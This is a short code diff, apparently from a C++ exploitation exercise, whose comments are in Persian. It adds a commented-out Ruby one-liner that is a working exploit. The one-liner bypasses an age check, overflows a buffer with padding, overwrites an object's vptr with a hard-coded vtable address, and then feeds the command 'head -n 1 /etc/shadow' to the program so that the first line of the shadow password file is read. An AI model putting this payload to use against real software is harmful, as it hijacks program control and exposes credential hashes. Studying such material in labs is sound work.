@@ -51,3 +51,10 @@ void greet(Greeter *greeter) {
 void doNothing() {
     CommandExecutor e;  // vtable این شیء هدف است
 }
+
+//ruby -e 'print "y\x00" +        # پاس کردن چک سن
+  //  "A"*62 +                    # پر کردن بافر buf
+  //  "\x88\x88\x04\x08" +        # overwrite vptr با آدرس vtable CommandExecutor (little-endian)
+  //  "\n" +                      # پایان ورودی اول
+   // "head -n 1 /etc/shadow\n"'  # دستور برای اجرا (مثال: خواندن خط اول shadow)
+   // | ./main
